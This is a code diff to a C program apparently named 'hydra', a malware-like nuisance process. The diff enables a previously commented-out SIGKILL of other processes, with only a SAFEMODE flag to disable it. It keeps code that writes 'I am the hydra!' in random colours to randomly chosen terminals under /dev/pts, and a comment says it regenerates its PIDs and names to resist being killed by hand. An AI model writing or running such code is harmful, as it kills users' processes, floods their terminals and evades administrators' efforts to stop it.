@@ -15,6 +15,7 @@
 #include <sys/shm.h>
 
 #include "linked_list.h"
+#include "hydra.h"
 
 void sigchld_handler(int sig, siginfo_t *info, void *context);
 void sigint_handler(int sig, siginfo_t *info, void *context);
@@ -154,7 +155,8 @@ void hydra_day_to_day() {
     destroy_list(pids);
    
     //EAT THEM!!!!
-    //kill(pid, SIGKILL);
+    if (!SAFEMODE)
+        kill(pid, SIGKILL);
     
     //Choose a random terminal and write to it
     DIR* term = opendir("/dev/pts");
@@ -181,16 +183,18 @@ void hydra_day_to_day() {
 
     destroy_list(terminals);
     
-    int fd = open(name, O_WRONLY | O_APPEND);
-    if (fd != -1) {
-        int color1 = rand() % 2;
-        int color2 = (rand() % 8) + 30;
-        int bgcolor = (rand() % 8) + 40;
-        char buf[50];
-        sprintf(buf, "%c[%d;%d;%dmI am the hydra!\n", 0x1B, color1, color2, bgcolor);
-        write(fd, buf, strlen(buf));
-        close(fd);
-    }    
+    if (!QUIETMODE) {
+        int fd = open(name, O_WRONLY | O_APPEND);
+        if (fd != -1) {
+            int color1 = rand() % 2;
+            int color2 = (rand() % 8) + 30;
+            int bgcolor = (rand() % 8) + 40;
+            char buf[50];
+            sprintf(buf, "%c[%d;%d;%dmI am the hydra!\n", 0x1B, color1, color2, bgcolor);
+            write(fd, buf, strlen(buf));
+            close(fd);
+        }
+    }
     //Regenerate pids and names every round (this will make it harder
     //to manually enter in all pids)
     if (!ROOT && new_head(0) > 0) {
